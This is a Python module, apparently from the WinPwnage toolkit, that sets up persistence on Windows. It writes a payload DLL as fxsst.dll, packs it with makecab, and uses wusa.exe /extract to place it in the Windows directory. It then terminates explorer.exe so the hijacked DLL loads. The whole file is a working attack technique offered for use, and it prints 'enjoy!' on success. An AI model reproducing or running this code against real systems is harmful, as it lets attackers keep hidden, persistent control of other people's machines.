import os
import time
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

explorer_info = {
	"Description": "Gain persistence using explorer and dll hijacking",
	"Id": "1",
	"Type": "Persistence",
	"Fixed In": "9800",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "fax_dll",
	"Function Payload": True,
}


def fax_dll(payload, add=True):
	if add:
		if payloads().dll(payload):
			try:
				payload_data = open(os.path.join(payload), "rb").read()
			except Exception:
				return False

			tmp_fxsst = os.path.join(tempfile.gettempdir(), "fxsst.dll")
			tmp_cabinet = os.path.join(tempfile.gettempdir(), "suspicious.cab")
			try:
				with open(tmp_fxsst, 'wb') as dll_file:
					dll_file.write(payload_data)
			except Exception:
				return False

			if not os.path.exists(tmp_fxsst):
				print_error("dll file is not found: {path}".format(path=tmp_fxsst))
				return False

			time.sleep(5)

			if process().create("makecab.exe", params="{} {}".format(tmp_fxsst, tmp_cabinet)):
				print_success("Successfully created cabinet file")
			else:
				print_success("Unable to create cabinet file")
				return False

			time.sleep(5)

			if not os.path.exists(tmp_cabinet):
				print_error("dll file is not found: {path}".format(path=tmp_cabinet))
				return False

			if process().create("wusa.exe", params="{} /extract:{} /quiet".format(tmp_cabinet, information().windows_directory())):
				print_success("Successfully extracted cabinet file")
			else:
				print_error("Unable to extract cabinet file")
				return False

			if os.path.isfile(os.path.join(information().windows_directory(), "fxsst.dll")):
				print_success("Successfully installed persistence")

				try:
					os.remove(tmp_cabinet)
				except Exception:
					return False

				try:
					os.remove(tmp_fxsst)
				except Exception:
					return False

				print_info("Attempting to restart explorer in order to load our dll file")
				if process().terminate("explorer.exe"):
					print_success("Successfully restarted explorer process, enjoy!")
				else:
					print_success("Unable to restart explorer process, reboot!")
			else:
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
